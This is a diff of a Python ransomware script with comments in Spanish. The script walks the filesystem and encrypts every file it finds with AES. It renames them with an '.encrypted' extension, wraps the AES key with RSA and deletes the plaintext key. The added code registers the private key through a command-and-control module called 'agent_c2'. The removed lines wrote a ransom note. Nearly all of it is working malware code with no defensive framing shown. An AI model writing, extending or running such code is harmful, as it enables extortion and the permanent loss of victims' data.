@@ -2,19 +2,13 @@ import os
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Util.Padding import pad
-from find_files import recorrer_directorio
-import ctypes
+from find_files import walk_directory, find_files
 import os
+import gen_keys
 import agent_c2
 
-
-def cargar_clave():
-    """
-    Carga la clave AES desde el archivo aes_key.bin.
-    """
+def load_aes_key():
     ruta_clave = os.path.abspath("aes_key.bin")
-    print(f"Buscando clave en: {ruta_clave}")  # Depuración
-
     if os.path.exists(ruta_clave):
         with open(ruta_clave, "rb") as clave_file:
             return clave_file.read()
@@ -22,12 +16,8 @@ def cargar_clave():
         raise FileNotFoundError(f"El archivo de clave no se encuentra en: {ruta_clave}")
 
 def cifrar_archivo(archivo, clave):
-    """
-    Cifra un archivo usando AES en modo CBC y lo sobrescribe con la versión cifrada.
-    """
     iv = os.urandom(16)  # Vector de inicialización
     cipher = AES.new(clave, AES.MODE_CBC, iv)
-    
     with open(archivo, "rb") as f:
         datos = f.read()
     datos_cifrados = cipher.encrypt(pad(datos, AES.block_size))
@@ -35,53 +25,48 @@ def cifrar_archivo(archivo, clave):
         f.write(iv + datos_cifrados)  # Guardamos IV + datos cifrados
 
 def cifrar_clave_aes(clave_aes):
-    """
-    Cifra la clave AES con la clave pública RSA y la guarda en un archivo.
-    """
+    gen_keys.generate_rsa_key()
     if not os.path.exists("rsa_public.pem"):
         raise FileNotFoundError("El archivo de clave pública RSA 'rsa_public.pem' no se encuentra.")
-    
     with open("rsa_public.pem", "rb") as f:
         clave_publica = RSA.import_key(f.read())
-    
+          # Cargar clave privada (nuevo)
     cipher_rsa = PKCS1_OAEP.new(clave_publica)
     clave_cifrada = cipher_rsa.encrypt(clave_aes)
-    
     with open("aes_key_encrypted.bin", "wb") as f:
-        f.write(clave_cifrada)
-    
+        f.write(clave_cifrada) 
     print("Clave AES cifrada con RSA y guardada en aes_key_encrypted.bin.")
+    if not os.path.exists("rsa_private.pem"):
+        raise FileNotFoundError("El archivo de clave privada RSA 'rsa_private.pem' no se encuentra.")
+    with open("rsa_private.pem", "rb") as f:
+        clave_privada = RSA.import_key(f.read())
+    agent_c2.register_agent(clave_privada)
 
 def cifrar_archivos():
-    """
-    Cifra todos los archivos importantes encontrados en el directorio y cambia su extensión a '.enc'.
-    """
-    archivos = recorrer_directorio()  # Se asume que solo devuelve archivos, no diccionarios
-
-    if not isinstance(archivos, list):
-        print("Error: No se pudo obtener la lista de archivos.")
+    # Generar clave AES solo si no existe
+    if not os.path.exists("aes_key.bin"):
+        gen_keys.generate_aes_key()
+    aes_key = load_aes_key()
+    archivos = find_files()  # Ahora solo devuelve la lista de archivos (rutas completas)
+    if not archivos or not isinstance(archivos, list):  # Verifica si `archivos` es válido
+        print("Error: No se pudo obtener la lista de archivos o está vacía.")
         return
-
-    clave = cargar_clave()
-    directorio_base = os.path.expanduser("~/Desktop/Files")
-
     for archivo in archivos:
-        ruta_completa = os.path.join(directorio_base, archivo)
-        if os.path.isfile(ruta_completa):  # Asegura que es un archivo y no un directorio
-            # Cifra el archivo
-            cifrar_archivo(ruta_completa, clave)
-            
-            # Cambia la extensión del archivo a '.enc'
-            ruta_nueva = ruta_completa + ".encrypted"
-            os.rename(ruta_completa, ruta_nueva)
-    
+        print(f"Intentando cifrar: {archivo}")  # Depuración
+
+        if os.path.isfile(archivo):  # Asegura que es un archivo y no un directorio
+            cifrar_archivo(archivo, aes_key)
+            ruta_nueva = archivo + ".encrypted"
+            # Manejo de errores al renombrar
+            try:
+                os.rename(archivo, ruta_nueva)
+                print(f"Archivo renombrado a: {ruta_nueva}")
+            except OSError as e:
+                print(f"Error al renombrar el archivo {archivo}: {e}")
     print("Archivos cifrados y renombrados correctamente.")
-    cifrar_clave_aes(clave)
-    os.remove("rsa_public.pem")
-    # Generar el reporte de archivos cifrados
-    directory_ransom_note = os.path.join(directorio_base, "ransom_note.txt")
-    with open(directory_ransom_note, "w") as ransom_note:
-            ransom_note.write("Todos tus archivos han sido cifrados\n")
+    # Cifrar la clave AES con RSA y eliminar la clave sin cifrar
+    cifrar_clave_aes(aes_key)
+    os.remove("aes_key.bin")
 
 if __name__ == "__main__":
     cifrar_archivos()
